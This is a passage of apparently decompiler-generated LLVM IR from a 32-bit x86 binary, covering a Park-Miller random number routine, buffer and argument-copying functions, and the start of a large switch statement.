  %v0_8052e01 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e01 = inttoptr i32 %v0_8052e01 to i32*
  %v2_8052e01 = load i32, i32* %v1_8052e01, align 4
  %v1_8052e03 = add i32 %v0_8052e01, 4
  store i32 %v1_8052e03, i32* %edx.global-to-local, align 4
  %v2_8052e06 = udiv i32 %v2_8052e01, 2
  %v1_8052e08 = load i32, i32* %edi.global-to-local, align 4
  %v7_8052e08 = icmp ult i32 %v1_8052e03, %v1_8052e08
  %v1_8052e0a = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052e0a = inttoptr i32 %v1_8052e0a to i32*
  store i32 %v2_8052e06, i32* %v2_8052e0a, align 4
  %v0_8052e0d = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e0d = add i32 %v0_8052e0d, 4
  store i32 %v1_8052e0d, i32* %eax.global-to-local, align 4
  br i1 %v7_8052e08, label %dec_label_pc_8052e16, label %dec_label_pc_8052e12

dec_label_pc_8052e12:                             ; preds = %dec_label_pc_8052df5
  %v0_8052e12 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8052e12, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052e1c

dec_label_pc_8052e16:                             ; preds = %dec_label_pc_8052df5
  %v1_8052e16 = load i32, i32* %edi.global-to-local, align 4
  %v7_8052e16 = icmp ult i32 %v1_8052e0d, %v1_8052e16
  br i1 %v7_8052e16, label %dec_label_pc_8052e1c, label %dec_label_pc_8052e1a

dec_label_pc_8052e1a:                             ; preds = %dec_label_pc_8052e16
  %v0_8052e1a = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8052e1a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e1c

dec_label_pc_8052e1c:                             ; preds = %dec_label_pc_8052e16, %dec_label_pc_8052e12, %dec_label_pc_8052e1a
  %v0_8052e1c = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e1c = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052e1c = inttoptr i32 %v1_8052e1c to i32*
  store i32 %v0_8052e1c, i32* %v2_8052e1c, align 4
  %v0_8052e1e = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e1e = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052e1e = add i32 %v1_8052e1e, 4
  %v3_8052e1e = inttoptr i32 %v2_8052e1e to i32*
  store i32 %v0_8052e1e, i32* %v3_8052e1e, align 4
  br label %dec_label_pc_8052e21

dec_label_pc_8052e21:                             ; preds = %dec_label_pc_8052dde, %dec_label_pc_8052e1c
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8052e23 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052e23, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8052de9, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8052e21, { 1, 0 }
  uselistorder label %dec_label_pc_8052e1c, { 2, 0, 1 }
}

define i32 @function_8052e28(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052e28:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8052e28 = load i32, i32* @ebp, align 4
  %v0_8052e29 = load i32, i32* @edi, align 4
  %v0_8052e2a = load i32, i32* @esi, align 4
  %v0_8052e2b = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_8052e36 = trunc i64 %arg1 to i32
  store i32 %v4_8052e36, i32* %eax.global-to-local, align 4
  %v1_8052e3a = add i32 %arg2, 12
  %v2_8052e3a = inttoptr i32 %v1_8052e3a to i32*
  %v3_8052e3a = load i32, i32* %v2_8052e3a, align 4
  store i32 %v3_8052e3a, i32* %edx.global-to-local, align 4
  %v6_8052e40 = icmp ugt i32 %v3_8052e3a, 4
  br i1 %v6_8052e40, label %dec_label_pc_8052eb4, label %dec_label_pc_8052e42

dec_label_pc_8052e42:                             ; preds = %dec_label_pc_8052e28
  %v1_8052e42 = add i32 %arg2, 8
  %v2_8052e42 = inttoptr i32 %v1_8052e42 to i32*
  %v3_8052e42 = load i32, i32* %v2_8052e42, align 4
  store i32 %v3_8052e42, i32* %ebx.global-to-local, align 4
  %v1_8052e45 = icmp eq i32 %v4_8052e36, 0
  %v1_8052e47 = icmp eq i1 %v1_8052e45, false
  br i1 %v1_8052e47, label %dec_label_pc_8052e4b, label %dec_label_pc_8052e49

dec_label_pc_8052e49:                             ; preds = %dec_label_pc_8052e42
  %v1_8052e49 = and i32 %v4_8052e36, -256
  %v2_8052e49 = or i32 %v1_8052e49, 1
  store i32 %v2_8052e49, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e4b

dec_label_pc_8052e4b:                             ; preds = %dec_label_pc_8052e42, %dec_label_pc_8052e49
  %v0_8052e4b = phi i32 [ %v4_8052e36, %dec_label_pc_8052e42 ], [ %v2_8052e49, %dec_label_pc_8052e49 ]
  %v2_8052e4b = inttoptr i32 %v3_8052e42 to i32*
  store i32 %v0_8052e4b, i32* %v2_8052e4b, align 4
  %v1_8052e4d = icmp eq i32 %v3_8052e3a, 0
  br i1 %v1_8052e4d, label %dec_label_pc_8052eb2, label %dec_label_pc_8052e51

dec_label_pc_8052e51:                             ; preds = %dec_label_pc_8052e4b
  %v0_8052e51 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8052e51, i32* %edx.global-to-local, align 4
  %v0_8052e53 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052e53, i32* %ecx.global-to-local, align 4
  %v0_8052e55 = load i32, i32* @esi, align 4
  %v1_8052e55 = add i32 %v0_8052e55, 16
  %v2_8052e55 = inttoptr i32 %v1_8052e55 to i32*
  %v3_8052e55 = load i32, i32* %v2_8052e55, align 4
  store i32 %v3_8052e55, i32* %eax.global-to-local, align 4
  %v4_8052e5d = sext i32 %v3_8052e55 to i64
  store i64 %v4_8052e5d, i64* %stack_var_-40, align 8
  %v5_8052e8f27 = icmp sgt i32 %v3_8052e55, 1
  br i1 %v5_8052e8f27, label %dec_label_pc_8052e62, label %dec_label_pc_8052e91

dec_label_pc_8052e62:                             ; preds = %dec_label_pc_8052e51, %dec_label_pc_8052e62.dec_label_pc_8052e62_crit_edge
  %v0_8052e86 = phi i32 [ %v0_8052e86.pre, %dec_label_pc_8052e62.dec_label_pc_8052e62_crit_edge ], [ %v0_8052e53, %dec_label_pc_8052e51 ]
  %v0_8052e62 = phi i32 [ %v0_8052e62.pre, %dec_label_pc_8052e62.dec_label_pc_8052e62_crit_edge ], [ %v0_8052e51, %dec_label_pc_8052e51 ]
  %v0_8052e8928 = phi i32 [ %v0_8052e8c.pre, %dec_label_pc_8052e62.dec_label_pc_8052e62_crit_edge ], [ 1, %dec_label_pc_8052e51 ]
  %v1_8052e69 = ashr i32 %v0_8052e62, 31
  %v2_8052e6a = zext i32 %v0_8052e62 to i64
  %v4_8052e6a = zext i32 %v1_8052e69 to i64
  %v5_8052e6a = mul nuw i64 %v4_8052e6a, 4294967296
  %v6_8052e6a = or i64 %v5_8052e6a, %v2_8052e6a
  %v8_8052e6a = sdiv i64 %v6_8052e6a, 127773
  %v9_8052e6a = trunc i64 %v8_8052e6a to i32
  %v10_8052e6a = srem i64 %v6_8052e6a, 127773
  %v3_8052e70 = mul nsw i64 %v10_8052e6a, 16807
  %v4_8052e70 = trunc i64 %v3_8052e70 to i32
  %v3_8052e76 = mul i32 %v9_8052e6a, 2836
  store i32 %v3_8052e76, i32* %eax.global-to-local, align 4
  %v2_8052e7c = sub i32 %v4_8052e70, %v3_8052e76
  %v13_8052e7c = icmp slt i32 %v2_8052e7c, 0
  %v1_8052e7e = icmp eq i1 %v13_8052e7c, false
  %v1_8052e80 = add i32 %v2_8052e7c, 2147483647
  %v2_8052e7c.v1_8052e80 = select i1 %v1_8052e7e, i32 %v2_8052e7c, i32 %v1_8052e80
  store i32 %v2_8052e7c.v1_8052e80, i32* %edx.global-to-local, align 4
  %v1_8052e86 = add i32 %v0_8052e86, 4
  store i32 %v1_8052e86, i32* %ecx.global-to-local, align 4
  %v1_8052e89 = add i32 %v0_8052e8928, 1
  store i32 %v1_8052e89, i32* @edi, align 4
  %v2_8052e8a = inttoptr i32 %v1_8052e86 to i32*
  store i32 %v2_8052e7c.v1_8052e80, i32* %v2_8052e8a, align 4
  %v0_8052e8c.pre = load i32, i32* @edi, align 4
  %v3_8052e8c.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_8052e8c.pre to i32
  %v5_8052e8f = icmp slt i32 %v0_8052e8c.pre, %extract.t12
  br i1 %v5_8052e8f, label %dec_label_pc_8052e62.dec_label_pc_8052e62_crit_edge, label %dec_label_pc_8052e8c.dec_label_pc_8052e91_crit_edge

dec_label_pc_8052e62.dec_label_pc_8052e62_crit_edge: ; preds = %dec_label_pc_8052e62
  %v0_8052e62.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_8052e86.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052e62

dec_label_pc_8052e8c.dec_label_pc_8052e91_crit_edge: ; preds = %dec_label_pc_8052e62
  %v0_8052e91.pre = load i32, i32* @esi, align 4
  %v0_8052e94.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052e91

dec_label_pc_8052e91:                             ; preds = %dec_label_pc_8052e8c.dec_label_pc_8052e91_crit_edge, %dec_label_pc_8052e51
  %v0_8052e94 = phi i32 [ %v0_8052e94.pre, %dec_label_pc_8052e8c.dec_label_pc_8052e91_crit_edge ], [ %v0_8052e53, %dec_label_pc_8052e51 ]
  %v0_8052e91 = phi i32 [ %v0_8052e91.pre, %dec_label_pc_8052e8c.dec_label_pc_8052e91_crit_edge ], [ %v0_8052e55, %dec_label_pc_8052e51 ]
  %v1_8052e91 = add i32 %v0_8052e91, 20
  %v2_8052e91 = inttoptr i32 %v1_8052e91 to i32*
  %v3_8052e91 = load i32, i32* %v2_8052e91, align 4
  store i32 %v3_8052e91, i32* %eax.global-to-local, align 4
  %v2_8052e94 = add i32 %v0_8052e91, 4
  %v3_8052e94 = inttoptr i32 %v2_8052e94 to i32*
  store i32 %v0_8052e94, i32* %v3_8052e94, align 4
  %v0_8052e97 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052e97 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052e97 = mul i32 %v1_8052e97, 4
  %v3_8052e97 = add i32 %v2_8052e97, %v0_8052e97
  store i32 %v3_8052e97, i32* %eax.global-to-local, align 4
  %v1_8052e9a = load i32, i32* @esi, align 4
  %v2_8052e9a = inttoptr i32 %v1_8052e9a to i32*
  store i32 %v3_8052e97, i32* %v2_8052e9a, align 4
  %v3_8052e9c = load i64, i64* %stack_var_-40, align 8
  %v6_8052e9c = mul nsw i64 %v3_8052e9c, 10
  %v7_8052e9c = trunc i64 %v6_8052e9c to i32
  %v2_8052ea2 = ptrtoint i32* %stack_var_-20 to i32
  %v1_8052eaf24 = add i32 %v7_8052e9c, -1
  %v9_8052eaf25 = icmp slt i32 %v1_8052eaf24, 0
  store i32 %v1_8052eaf24, i32* @ebx, align 4
  %v1_8052eb026 = icmp eq i1 %v9_8052eaf25, false
  br i1 %v1_8052eb026, label %dec_label_pc_8052ea2, label %dec_label_pc_8052eb2

dec_label_pc_8052ea2:                             ; preds = %dec_label_pc_8052e91, %dec_label_pc_8052ea2
  store i32 %v2_8052ea2, i32* %eax.global-to-local, align 4
  %v0_8052ea7 = load i32, i32* @esi, align 4
  %v2_8052ea8 = inttoptr i32 %v0_8052ea7 to i32*
  %v3_8052ea8 = call i32 @function_8052dc9(i32* %v2_8052ea8, i32 %v2_8052ea2)
  store i32 %v0_8052ea7, i32* %eax.global-to-local, align 4
  store i32 %v2_8052ea2, i32* %edx.global-to-local, align 4
  %v0_8052eaf.pre = load i32, i32* @ebx, align 4
  %v1_8052eaf = add i32 %v0_8052eaf.pre, -1
  %v9_8052eaf = icmp slt i32 %v1_8052eaf, 0
  store i32 %v1_8052eaf, i32* @ebx, align 4
  %v1_8052eb0 = icmp eq i1 %v9_8052eaf, false
  br i1 %v1_8052eb0, label %dec_label_pc_8052ea2, label %dec_label_pc_8052eb2

dec_label_pc_8052eb2:                             ; preds = %dec_label_pc_8052e91, %dec_label_pc_8052ea2, %dec_label_pc_8052e4b
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052eb4

dec_label_pc_8052eb4:                             ; preds = %dec_label_pc_8052e28, %dec_label_pc_8052eb2
  %v0_8052eb7 = phi i32 [ -1, %dec_label_pc_8052e28 ], [ 0, %dec_label_pc_8052eb2 ]
  store i32 %v0_8052eb7, i32* %eax.global-to-local, align 4
  store i32 %v0_8052e2b, i32* @ebx, align 4
  store i32 %v0_8052e2a, i32* @esi, align 4
  store i32 %v0_8052e29, i32* @edi, align 4
  store i32 %v0_8052e28, i32* @ebp, align 4
  ret i32 %v0_8052eb7

; uselistorder directives
  uselistorder i32 %v0_8052eb7, { 1, 0 }
  uselistorder i32 %v1_8052eaf, { 1, 0 }
  uselistorder i32 %v0_8052e91, { 1, 0 }
  uselistorder i32 %v0_8052e8c.pre, { 1, 0 }
  uselistorder i32 %v2_8052e7c.v1_8052e80, { 1, 0 }
  uselistorder i32 %v0_8052e62, { 1, 0 }
  uselistorder i32 %v0_8052e53, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052eb4, { 1, 0 }
  uselistorder label %dec_label_pc_8052eb2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052ea2, { 1, 0 }
  uselistorder label %dec_label_pc_8052e62, { 1, 0 }
  uselistorder label %dec_label_pc_8052e4b, { 1, 0 }
}

define i32 @function_8052ebe(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052ebe:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8052ec1 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_8052ee2, label %dec_label_pc_8052ed6

dec_label_pc_8052ed6:                             ; preds = %dec_label_pc_8052ebe
  %v2_8052ed6 = icmp ult i32 %arg3, 256
  %v1_8052edd = select i1 %v2_8052ed6, i32 5, i32 4
  store i32 %v1_8052edd, i32* @ebx, align 4
  br label %dec_label_pc_8052ef8

dec_label_pc_8052ee2:                             ; preds = %dec_label_pc_8052ebe
  %v6_8052ee5 = icmp ugt i32 %arg3, 31
  br i1 %v6_8052ee5, label %dec_label_pc_8052ef0, label %dec_label_pc_8052ee7

dec_label_pc_8052ee7:                             ; preds = %dec_label_pc_8052ee2
  store i32 0, i32* @ebx, align 4
  %v6_8052eec = icmp ugt i32 %arg3, 7
  br i1 %v6_8052eec, label %dec_label_pc_8052ef8, label %dec_label_pc_8052f48

dec_label_pc_8052ef0:                             ; preds = %dec_label_pc_8052ee2
  %v2_8052ef0 = icmp ult i32 %arg3, 64
  %v1_8052ef5 = select i1 %v2_8052ef0, i32 3, i32 2
  store i32 %v1_8052ef5, i32* @ebx, align 4
  br label %dec_label_pc_8052ef8

dec_label_pc_8052ef8:                             ; preds = %dec_label_pc_8052ee7, %dec_label_pc_8052ed6, %dec_label_pc_8052ef0
  %v0_8052ef8 = phi i32 [ 0, %dec_label_pc_8052ee7 ], [ %v1_8052edd, %dec_label_pc_8052ed6 ], [ %v1_8052ef5, %dec_label_pc_8052ef0 ]
  %v1_8052ef8 = mul nuw nsw i32 %v0_8052ef8, 4
  %v2_8052ef8 = add i32 %v1_8052ef8, ptrtoint (i32* @global_var_805c2b4.368 to i32)
  %v3_8052ef8 = inttoptr i32 %v2_8052ef8 to i32*
  %v4_8052ef8 = load i32, i32* %v3_8052ef8, align 4
  store i32 %v4_8052ef8, i32* %eax.global-to-local, align 4
  %v1_8052eff = add i32 %tmp7, 4
  store i32 %v1_8052eff, i32* @esi, align 4
  %v2_8052f02 = add i32 %arg4, 16
  %v3_8052f02 = inttoptr i32 %v2_8052f02 to i32*
  store i32 %v4_8052ef8, i32* %v3_8052f02, align 4
  %v0_8052f05 = load i32, i32* @ebx, align 4
  %v1_8052f05 = mul i32 %v0_8052f05, 4
  %v2_8052f05 = add i32 %v1_8052f05, ptrtoint (i32* @global_var_805c2a0.369 to i32)
  %v3_8052f05 = inttoptr i32 %v2_8052f05 to i32*
  %v4_8052f05 = load i32, i32* %v3_8052f05, align 4
  store i32 %v4_8052f05, i32* %edx.global-to-local, align 4
  %v0_8052f0c = load i32, i32* @esi, align 4
  %v1_8052f0c = load i32, i32* %eax.global-to-local, align 4
  %v2_8052f0c = mul i32 %v1_8052f0c, 4
  %v3_8052f0c = add i32 %v2_8052f0c, %v0_8052f0c
  store i32 %v3_8052f0c, i32* %eax.global-to-local, align 4
  %v1_8052f0f = load i32, i32* @edi, align 4
  %v2_8052f0f = add i32 %v1_8052f0f, 12
  %v3_8052f0f = inttoptr i32 %v2_8052f0f to i32*
  store i32 %v0_8052f05, i32* %v3_8052f0f, align 4
  %v0_8052f12 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052f12 = load i32, i32* @edi, align 4
  %v2_8052f12 = add i32 %v1_8052f12, 20
  %v3_8052f12 = inttoptr i32 %v2_8052f12 to i32*
  store i32 %v0_8052f12, i32* %v3_8052f12, align 4
  %v0_8052f15 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f15 = load i32, i32* @edi, align 4
  %v2_8052f15 = add i32 %v1_8052f15, 24
  %v3_8052f15 = inttoptr i32 %v2_8052f15 to i32*
  store i32 %v0_8052f15, i32* %v3_8052f15, align 4
  %v0_8052f18 = load i32, i32* @esi, align 4
  %v1_8052f18 = load i32, i32* @edi, align 4
  %v2_8052f18 = add i32 %v1_8052f18, 8
  %v3_8052f18 = inttoptr i32 %v2_8052f18 to i32*
  store i32 %v0_8052f18, i32* %v3_8052f18, align 4
  %v0_8052f1b = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8052f20 = sext i32 %arg1 to i64
  %v3_8052f20 = call i32 @function_8052e28(i64 %v2_8052f20, i32 %v0_8052f1b)
  %v0_8052f25 = load i32, i32* @ebp, align 4
  %v1_8052f25 = inttoptr i32 %v0_8052f25 to i32*
  store i32 0, i32* %v1_8052f25, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8052f30 = load i32, i32* @ebx, align 4
  %v1_8052f30 = icmp eq i32 %v0_8052f30, 0
  br i1 %v1_8052f30, label %dec_label_pc_8052f61, label %dec_label_pc_8052f34

dec_label_pc_8052f34:                             ; preds = %dec_label_pc_8052ef8
  %v0_8052f34 = load i32, i32* @edi, align 4
  %v1_8052f34 = add i32 %v0_8052f34, 4
  %v2_8052f34 = inttoptr i32 %v1_8052f34 to i32*
  %v3_8052f34 = load i32, i32* %v2_8052f34, align 4
  %v1_8052f37 = load i32, i32* @esi, align 4
  %v2_8052f37 = sub i32 %v3_8052f34, %v1_8052f37
  %v2_8052f39 = sdiv i32 %v2_8052f37, 4
  %v3_8052f3c = mul i32 %v2_8052f39, 5
  %v2_8052f3f = add i32 %v3_8052f3c, %v0_8052f30
  %v1_8052f41 = load i32, i32* @ebp, align 4
  %v2_8052f41 = inttoptr i32 %v1_8052f41 to i32*
  store i32 %v2_8052f3f, i32* %v2_8052f41, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f61

dec_label_pc_8052f48:                             ; preds = %dec_label_pc_8052ee7
  %v1_8052f48 = call i32 @function_8050568(i32 %v0_8052ec1)
  store i32 %v1_8052f48, i32* %eax.global-to-local, align 4
  %v1_8052f4d = inttoptr i32 %v1_8052f48 to i32*
  store i32 22, i32* %v1_8052f4d, align 4
  %v0_8052f53 = load i32, i32* %stack_var_-36, align 4
  %v1_8052f53 = call i32 @function_8050568(i32 %v0_8052f53)
  %v1_8052f58 = inttoptr i32 %v1_8052f53 to i32*
  store i32 22, i32* %v1_8052f58, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f61

dec_label_pc_8052f61:                             ; preds = %dec_label_pc_8052ef8, %dec_label_pc_8052f34, %dec_label_pc_8052f48
  %v0_8052f68 = phi i32 [ 0, %dec_label_pc_8052ef8 ], [ 0, %dec_label_pc_8052f34 ], [ -1, %dec_label_pc_8052f48 ]
  ret i32 %v0_8052f68

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052f61, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052ef8, { 2, 0, 1 }
}

define i32 @function_80531e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_80531e8:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_80531fb = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80531fb, i32* @ebx, align 4
  %v2_8053200 = call i32 @function_80535d2(i32 %v2_80531fb, i32 134559183)
  %v1_805320c = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d860.370 to i32))
  %v0_8053211 = load i32, i32* @global_var_8063b04.371, align 4
  store i32 %v0_8053211, i32* @eax, align 4
  %v1_8053219 = icmp eq i32 %v0_8053211, 0
  br i1 %v1_8053219, label %dec_label_pc_8053226, label %dec_label_pc_805321d

dec_label_pc_805321d:                             ; preds = %dec_label_pc_80531e8
  %v0_8053220 = load i32, i32* @esi, align 4
  %v1_8053221 = call i32 @unknown_0(i32 %v0_8053220)
  store i32 %v1_8053221, i32* @eax, align 4
  br label %dec_label_pc_8053226

dec_label_pc_8053226:                             ; preds = %dec_label_pc_80531e8, %dec_label_pc_805321d
  %v2_805322b = call i32 @function_80535d2(i32 %v2_80531fb, i32 1)
  %v0_8053230 = call i32 @function_8053590()
  %v0_8053241 = call i32 @function_80506bc()
  %v0_8053249 = load i32, i32* @esi, align 4
  %v1_805324a = call i32 @function_80500ac(i32 %v0_8053249)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_80500ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053226, { 1, 0 }
}

define i32 @function_8053250(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8053250:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8053257 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8053257, i32* %eax.global-to-local, align 4
  %v12_805325a = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8053260

dec_label_pc_8053260:                             ; preds = %dec_label_pc_8053260, %dec_label_pc_8053250
  %v0_8053263 = phi i32 [ 0, %dec_label_pc_8053250 ], [ %v1_8053263, %dec_label_pc_8053260 ]
  %stack_var_-16.0 = phi i32 [ %v2_8053257, %dec_label_pc_8053250 ], [ %v1_8053264, %dec_label_pc_8053260 ]
  %v1_8053263 = add i32 %v0_8053263, 1
  store i32 %v1_8053263, i32* %esi.global-to-local, align 4
  %v1_8053264 = add i32 %stack_var_-16.0, 4
  store i32 %v1_8053264, i32* %eax.global-to-local, align 4
  %v1_805326a = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_805326a = load i32, i32* %v1_805326a, align 4
  %v3_805326a = icmp eq i32 %v2_805326a, 0
  %v1_805326d = icmp eq i1 %v3_805326a, false
  br i1 %v1_805326d, label %dec_label_pc_8053260, label %dec_label_pc_805326f

dec_label_pc_805326f:                             ; preds = %dec_label_pc_8053260
  %v1_805326f = mul i32 %v1_8053263, 4
  %v2_805326f = add i32 %v1_805326f, 34
  %v1_8053276 = and i32 %v2_805326f, -16
  %v2_8053279 = sub i32 %v12_805325a, %v1_8053276
  %v1_805327e = add i32 %v2_8053279, 15
  %v1_8053282 = and i32 %v1_805327e, -16
  store i32 %v1_8053282, i32* @ebx, align 4
  store i32 %v1_8053282, i32* %ecx.global-to-local, align 4
  %v2_8053287 = inttoptr i32 %v1_8053282 to i32*
  store i32 %arg2, i32* %v2_8053287, align 16
  store i32 %v2_8053257, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805328f

dec_label_pc_805328f:                             ; preds = %dec_label_pc_805328f, %dec_label_pc_805326f
  %stack_var_-16.1 = phi i32 [ %v2_8053257, %dec_label_pc_805326f ], [ %v1_8053296, %dec_label_pc_805328f ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8053292 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053292 = add i32 %v0_8053292, 4
  store i32 %v1_8053292, i32* %ecx.global-to-local, align 4
  %v0_8053295 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053295 = add i32 %v0_8053295, -1
  %v8_8053295 = icmp eq i32 %v1_8053295, 0
  store i32 %v1_8053295, i32* %esi.global-to-local, align 4
  %v1_8053296 = add i32 %stack_var_-16.1, 4
  %v1_805329c = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_805329c = load i32, i32* %v1_805329c, align 4
  store i32 %v2_805329c, i32* %eax.global-to-local, align 4
  %v2_805329e = inttoptr i32 %v1_8053292 to i32*
  store i32 %v2_805329c, i32* %v2_805329e, align 4
  %v1_80532a0 = icmp eq i1 %v8_8053295, false
  br i1 %v1_80532a0, label %dec_label_pc_805328f, label %dec_label_pc_80532a2

dec_label_pc_80532a2:                             ; preds = %dec_label_pc_805328f
  %v0_80532a2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80532a2 = load i32, i32* @esp, align 4
  %v2_80532a2 = add i32 %v1_80532a2, -4
  %v3_80532a2 = inttoptr i32 %v2_80532a2 to i32*
  store i32 %v0_80532a2, i32* %v3_80532a2, align 4
  %v0_80532a3 = load i32, i32* @global_var_8063b0c.372, align 4
  %v2_80532a3 = add i32 %v1_80532a2, -8
  %v3_80532a3 = inttoptr i32 %v2_80532a3 to i32*
  store i32 %v0_80532a3, i32* %v3_80532a3, align 4
  %v0_80532a9 = load i32, i32* @ebx, align 4
  %v2_80532a9 = add i32 %v1_80532a2, -12
  %v3_80532a9 = inttoptr i32 %v2_80532a9 to i32*
  store i32 %v0_80532a9, i32* %v3_80532a9, align 4
  %v5_80532aa = add i32 %v1_80532a2, -16
  %v6_80532aa = inttoptr i32 %v5_80532aa to i32*
  store i32 %arg1, i32* %v6_80532aa, align 4
  %v1_80532ad = inttoptr i32 %v1_8053296 to i8*
  %v2_80532ad = call i32 @function_80539c0(i8* %v1_80532ad)
  store i32 %v2_80532ad, i32* %eax.global-to-local, align 4
  ret i32 %v2_80532ad

; uselistorder directives
  uselistorder i32 %v1_8053295, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8053264, { 1, 0 }
  uselistorder i32 %v1_8053263, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8053257, { 0, 2, 1, 3 }
}

define i32 @function_8053448(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053448:
  switch i32 %arg1, label %dec_label_pc_8053467 [
    i32 0, label %dec_label_pc_8053477
    i32 1, label %dec_label_pc_805355c
    i32 2, label %dec_label_pc_8053481
    i32 3, label %dec_label_pc_805348b
    i32 4, label %dec_label_pc_8053495
    i32 5, label %dec_label_pc_805352b
    i32 6, label %dec_label_pc_805349d
    i32 7, label %dec_label_pc_805345d
    i32 8, label %dec_label_pc_805345d
    i32 9, label %dec_label_pc_805345d
    i32 10, label %dec_label_pc_805345d
    i32 11, label %dec_label_pc_805345d
    i32 12, label %dec_label_pc_805345d
    i32 13, label %dec_label_pc_805345d
    i32 14, label %dec_label_pc_805345d
    i32 15, label %dec_label_pc_805345d
    i32 16, label %dec_label_pc_805345d
    i32 17, label %dec_label_pc_805345d
    i32 18, label %dec_label_pc_805345d
    i32 19, label %dec_label_pc_805345d
    i32 20, label %dec_label_pc_805345d
    i32 21, label %dec_label_pc_805345d
    i32 22, label %dec_label_pc_805345d
    i32 23, label %dec_label_pc_805355c
    i32 24, label %dec_label_pc_805355c
    i32 25, label %dec_label_pc_8053568
    i32 26, label %dec_label_pc_8053539
    i32 27, label %dec_label_pc_805355c
    i32 28, label %dec_label_pc_80534af
    i32 29, label %dec_label_pc_8053532
    i32 30, label %dec_label_pc_80534a7
    i32 31, label %dec_label_pc_8053547
    i32 32, label %dec_label_pc_805355c
    i32 33, label %dec_label_pc_805355c
